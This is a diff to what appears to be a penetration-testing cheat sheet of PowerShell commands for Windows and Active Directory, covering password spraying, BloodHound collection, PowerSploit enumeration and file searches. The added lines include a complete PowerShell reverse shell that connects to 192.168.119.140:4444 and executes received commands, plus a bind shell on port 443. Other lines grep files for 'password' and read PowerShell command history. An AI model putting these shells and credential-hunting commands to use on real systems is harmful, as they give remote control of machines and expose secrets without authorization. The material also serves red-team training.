@@ -20,7 +20,6 @@ Azure Password Spray----Invoke-MSOLSpray -Userlist ./users.txt -Password "Spring
 PowerShell Command History File----% AppData Roaming Microsoft Windows PowerShell PSReadLine ConsoleHost_history.txt
 
 ##WMIC
-List all Files in Directory----Get-ChildItem C:\Users\user -Recurse
 List Scheduled Tasks----
 Raw WMIC Query----Get-CimInstance -Query "SELECT * from Win32_Process WHERE name LIKE 'P%'"
 Get AVs Installed----##Get-CimInstance -Namespace root\securitycenter2 AntiSpywareProduct; Get-CimInstance -Namespace root\securitycenter2 AntiVirusProduct;
@@ -35,7 +34,9 @@ EXE Ingestor----.\SharpHound.exe --CollectionMethod All --LDAPUser <UserName> --
 Powershell Ingestor (SharpHound.ps1)----Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
 Start Neo4J and Import Bloodhound Results----##systemctl start neo4j; Navigate to http://127.0.0.1:7373; Configure username and password; ./BloodHound-linux-x64/BloodHound; Authenticate to Neo4j server; Upload the BloodHound.zip file within the GUI.
 
-
+PowerShell Reverse Shell----##$client = New-Object System.Net.Sockets.TCPClient("192.168.119.140",4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2<&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+PowerShell Bind Shell----##$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443); $listener.start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]
+$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes,0,$bytes.Length))) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}$client.Close();$listener.Stop();
 
 ##PowerSploit
 Enumerate User----Get-NetUser <user>
@@ -94,6 +95,27 @@ Query Specific Windows Event IDs-----Get-WinEvent -FilterHashTable @{logname='Mi
 
 ##Basics
 List Environment Variables----Get-ChildItem Env:
+List $PATH Environment Variable----(gci env:PATH).value.replace(";","`n")
 Quickly list out numbers----1..255
 List Properties of a Registry Key----(Get-Item HKLM:\SYSTEM\CurrentControlSet\Control\Lsa) | Get-ItemProperty
 Run .PS1 File----. .\Add-SSP
+List all Files in Directory----Get-ChildItem C:\Users\user -Recurse
+Recusively grep through all files in directory----Get-ChildItem . -Recurse -ErrorAction Silentlycontinue | Select-String -Pattern "password"
+List loaded assemblies in current process----[appdomain]::currentdomain.getassemblies() | so -Property fullname | ft fullname
+
+
+
+##Pinvoke
+Basic Pinvoke----"""
+$User32 = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class User32{
+    [DllImport("user32.dll", CharSet=CharSet.Auto)]
+    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
+}
+"@
+
+Add-Type $User32
+[User32]::MessageBox(0,"This is an alert", "MyBox", 0)"""
